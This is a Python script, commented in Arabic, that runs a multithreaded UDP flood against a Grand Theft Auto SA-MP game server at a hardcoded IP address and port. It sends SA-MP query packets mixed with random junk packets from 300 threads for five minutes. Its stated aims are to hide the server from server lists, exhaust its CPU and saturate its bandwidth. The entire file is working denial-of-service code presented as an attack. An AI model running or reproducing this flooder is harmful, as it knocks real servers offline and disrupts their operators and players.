import socket
import random
import threading
import time

# =====================================================================
# === TRAPKING DUAL-TARGET HYBRID STRESSOR (Query + Game Flood) ===
# =====================================================================

TARGET_IP = "94.23.168.153"  # IP الهدف
TARGET_PORT = 2343            # البورت الرئيسي (استعلام + لعب)
DURATION = 300                 # مدة التشغيل بالثواني
THREADS_COUNT = 300           # عدد الخيوط لاستغلال قوة Ryzen 9

# أنواع الاستعلامات المتاحة
QUERY_TYPES = [b'i', b'c', b'r', b'd']

def hybrid_attack_worker():
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + DURATION
    
    # تحضير ترويسة الاستعلام مسبقاً لتوفير أداء المعالج
    try:
        ip_bytes = socket.inet_aton(TARGET_IP)
        port_bytes = int(TARGET_PORT).to_bytes(2, 'little')
    except:
        return

    while time.time() < end_time:
        try:
            # 1. إرسال حزمة استعلام (لإخفاء السيرفر من القوائم وإجهاد الـ CPU)
            q_type = random.choice(QUERY_TYPES)
            query_packet = b'SAMP' + ip_bytes + port_bytes + q_type
            client.sendto(query_packet, (TARGET_IP, TARGET_PORT))
            
            # 2. إرسال حزمة ضغط عشوائية بحجم كبير (لإشغال ممر الشبكة Bandwidth)
            junk_size = random.randint(512, 1200)
            junk_packet = b'SAMP' + random._urandom(junk_size)
            client.sendto(junk_packet, (TARGET_IP, TARGET_PORT))
            
        except:
            pass
            
    client.close()

def main():
    print(f"[*] بدء الهجوم المزدوج والهجين على سيرفر SA-MP: {TARGET_IP}:{TARGET_PORT}")
    print(f"[*] دمج حزم الاستعلام وحزم الضغط الشبكي عبر {THREADS_COUNT} خيط...")
    
    threads = []
    for _ in range(THREADS_COUNT):
        t = threading.Thread(target=hybrid_attack_worker)
        threads.append(t)
        t.start()
        
    for t in threads:
        t.join()
        
    print("\n[+] انتهت الجلسة المزدوجة بنجاح.")

if __name__ == "__main__":
    main()
